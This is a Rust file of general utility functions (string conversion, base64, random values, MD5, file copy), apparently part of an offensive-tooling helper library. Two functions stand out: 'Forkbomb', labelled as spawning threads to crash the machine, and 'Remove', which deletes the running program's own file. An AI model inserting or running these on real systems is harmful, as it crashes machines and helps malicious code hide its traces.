mod linux;
use rand::Rng;
use std::{
    env, fs,
    fs::File,
    io,
    io::{prelude::*, BufReader},
    net::UdpSocket,
    path::Path,
    process::Command,
};

// Revert returns a reversed string.
fn Revert(s: String) -> String {
    let reverted_string = s.chars().rev().collect::<String>();
    reverted_string
}

// FileToSlice reads a textfile and returns all lines as a vector.
fn FileToSlice(filename: &str) -> Vec<String> {
    let file = File::open(filename).expect("no such file");
    let buf = BufReader::new(file);
    buf.lines()
        .map(|l| l.expect("Could not parse line"))
        .collect()
}

// StrToInt converts a string into an integer.
fn StrToInt(string_integer: String) -> u32 {
    string_integer.parse::<u32>().unwrap()
}

// StrToWords returns a list of strings which was split by spaces.
fn StrToWords(s: &str) -> Vec<&str> {
    s.split(' ').collect()
}

// IntToStr converts an integer into a string.
fn IntToStr(i: u32) -> String {
    i.to_string()
}

// SizeToBytes converts a human friendly string indicating size into a proper integer.
fn SizeToBytes(size: &str) -> u128 {
    let mut size = size.to_string();
    let last_chara = size.chars().last().unwrap();
    size.pop();
    let i: u128 = size.parse().unwrap();
    match last_chara {
        'g' => i * 1024 * 1024 * 1024,
        'm' => i * 1024 * 1024,
        'k' => i * 1024,
        _ => i,
    }
}

// IntervalToSeconds converts a human friendly string indicating time into a proper integer.
fn IntervalToSeconds(interval: &str) -> u128 {
    let mut interval = interval.to_string();
    let last_chara = interval.chars().last().unwrap();
    interval.pop();
    let i: u128 = interval.parse().unwrap();
    match last_chara {
        'd' => i * 24 * 3600,
        'h' => i * 3600,
        'm' => i * 60,
        's' => i,
        _ => i,
    }
}

// RandomInt returns an integer within a given range.
fn RandomInt(min: u32, max: u32) -> u32 {
    rand::thread_rng().gen_range(min..max)
}

// RandomSelectStr returns a string that was randomly selected from a list of elements of vector.
fn RandomSelectStr(list: Vec<String>) -> String {
    let mut rng = rand::thread_rng();
    let n = rng.gen_range(0..list.len());
    list[n].clone()
}

// RandomSelectInt returns an integer that was randomly selected from a list of vector of integers.
fn RandomSelectInt(list: Vec<u32>) -> u32 {
    let mut rng = rand::thread_rng();
    let n = rng.gen_range(0..list.len());
    list[n]
}

// RemoveNewLines removes possible newlines from a string.
fn RemoveNewlines(s: String) -> String {
    s.replace("\n", " ")
}

// FullRemove removes all instances of a string from another string.
fn FullRemove(str: String, to_remove: String) -> String {
    str.replace(&to_remove, "")
}

// ContainsAny checks if a string exists within a vector of strings.
fn ContainsAny(str: String, elements: Vec<String>) -> bool {
    elements.contains(&str)
}

// RandomString randomly generates an alphabetic string of a given length.
fn RandomString(n: usize) -> String {
    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    let password_len: usize = n;
    let mut rng = rand::thread_rng();

    (0..password_len)
        .map(|_| {
            let idx = rng.gen_range(0..CHARSET.len());
            CHARSET[idx] as char
        })
        .collect()
}

// GetLocalIp is used to get the local Ip address of the machine.
fn GetLocalIp() -> io::Result<std::net::SocketAddr> {
    let socket = UdpSocket::bind(("0.0.0.0", 0))?;
    socket.connect(("8.8.8.8", 80))?;
    socket.local_addr()
}

// MD5Hash hashes a given string using the MD5.
fn MD5Hash(s: &str) -> String {
    let digest = md5::compute(s.as_bytes());
    format!("{:x}", digest)
}

// ReadFile is used to read a given file and return its data as a string.
fn ReadFile(filename: String) -> Result<String, std::io::Error> {
    fs::read_to_string(filename)
}

// WriteFile is used to write data into a given file.
fn WriteFile(filename: &str, data: &str) -> Result<(), std::io::Error> {
    fs::write(filename, data)
}

// B64D decodes a given string encoded in Base64.
fn B64D(s: &str) -> String {
    String::from_utf8_lossy(&base64::decode(s).unwrap()).to_string()
}

// B64E encodes a string in Base64.
fn B64E(s: &str) -> String {
    let b64 = base64::encode(s.as_bytes());
    b64
}

// Wait uses a human friendly string that indicates how long a system should wait.
fn Wait(s: &str) {
    let mut child = Command::new("sleep").arg(s).spawn().unwrap();
    let time = child.wait().unwrap();
}

// Forkbomb spawns threads in order to crash the machine.
fn Forkbomb() {
    loop {
        std::thread::spawn(Forkbomb);
    }
}

// Remove is used to delete the program file.
fn Remove() -> std::io::Result<()> {
    let args: Vec<_> = env::args().collect();
    fs::remove_file(args[0].to_owned())?;
    Ok(())
}

// Exists checks if a given file is in the system.
fn Exists(file: String) -> bool {
    Path::new(&file).exists()
}

// CopyFile copies a file from one directory to another.
fn CopyFile(src: &str, dst: &str) -> std::io::Result<()> {
    fs::copy(src, dst)?;
    Ok(())
}

fn main() {}
